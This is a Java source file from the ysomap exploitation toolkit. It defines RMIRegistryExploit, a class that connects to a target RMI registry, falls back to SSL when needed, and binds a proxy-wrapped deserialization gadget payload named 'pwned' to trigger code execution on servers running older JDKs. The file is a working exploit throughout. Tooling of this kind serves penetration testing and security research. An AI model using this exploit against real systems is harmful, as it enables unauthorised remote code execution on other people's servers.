package ysomap.exploit.rmi;

import ysomap.annotation.Authors;
import ysomap.annotation.Dependencies;
import ysomap.annotation.Require;
import ysomap.exploit.Exploit;
import ysomap.exploit.rmi.component.RMISSLClientSocketFactory;
import ysomap.util.PayloadHelper;

import java.rmi.ConnectIOException;
import java.rmi.Remote;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * @author wh1t3P1g
 * @since 2020/2/25
 */
@Authors({Authors.WH1T3P1G})
@Require(bullets = {"all gadgets","RMIConnectWrapped","RMIConnectWrappedWithProxy"})
@Dependencies({"jdk<jdk8u121","need set a gadget"})
public class RMIRegistryExploit extends Exploit {

    @Require(name = "thost", detail = "target RMI Registry host")
    public String thost;
    @Require(name = "tport", type="int",detail = "target RMI Registry port, default 1099")
    public String tport = "1099";

    public Object payload;

    public String payloadName;

    @Override
    public void run() {
        try {
            Registry registry = LocateRegistry.getRegistry(thost, Integer.parseInt(tport));

            // test RMI registry connection and upgrade to SSL connection on fail
            try {
                registry.list();
            } catch(ConnectIOException ex) {
                registry = LocateRegistry.getRegistry(thost, Integer.parseInt(tport), new RMISSLClientSocketFactory());
            }

            String name = "pwned" + System.nanoTime();
            Remote remote = null;
            if(payload instanceof Remote){
                remote = (Remote) payload;
            }else{
                remote = PayloadHelper.createMemoitizedProxy(PayloadHelper.createMap(name, payload), Remote.class);
            }

            try {
                registry.bind(name, remote);
            } catch (Throwable e) {
                e.printStackTrace();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        exit = true;
    }

    @Override
    public String toString() {
        return "RMIRegistryExploit{" +
                "thost='" + thost + '\'' +
                ", tport='" + tport + '\'' +
                ", payload=" + payloadName +
                '}';
    }
}
